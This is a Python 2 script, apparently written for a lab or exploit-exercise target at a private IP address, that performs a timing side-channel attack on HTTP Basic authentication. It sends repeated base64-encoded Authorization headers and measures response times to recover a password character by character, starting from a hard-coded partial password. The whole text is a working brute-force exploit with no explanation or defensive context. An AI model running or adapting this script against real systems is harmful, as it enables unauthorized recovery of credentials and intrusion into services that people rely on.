import binascii, socket, time, string, base64

s = socket.socket()
s.connect(("192.168.72.134",20004))
charList = string.ascii_letters + string.digits
print ("[*] Character space being used : " +str(charList))
mostCommon = []
#times = [0 for stuff in xrange(len(charList))]
responseTime = 100
prevPassword = "7vK3qG6pli5LNOV"
guessed = len(prevPassword)
while guessed < 16:
	times = [0 for stuff in xrange(len(charList))]
	for guess in xrange(300):
		for letter in xrange(len(charList)):
			s = socket.socket()
			s.connect(("192.168.72.134",20004))
			charList = string.ascii_letters + string.digits
			request = "GET /path/file.html HTTP/1.0\r\n"
			request += "Authorization: Basic "
			request +=  base64.b64encode(prevPassword + charList[letter] + ((len(prevPassword)+1)%4)*'X'    ) + "\r\n"
			time.sleep(.05)
			a = time.time()
			s.sendall(request)
			junk = s.recv(1024)
			times[letter] += (time.time() - a)
		print "Iteration: " + str(guess)
	#print times
	responseTime = min(xrange(len(times)), key=times.__getitem__)
	print "Minimum response value found at: " + str(responseTime) 
	print "The corresponding character should be: " + str(charList[responseTime])
	prevPassword += charList[responseTime]
	print "New guess for password characters: " + prevPassword
	guessed += 1
print "Final password as found by estimation through timing is : " + prevPassword
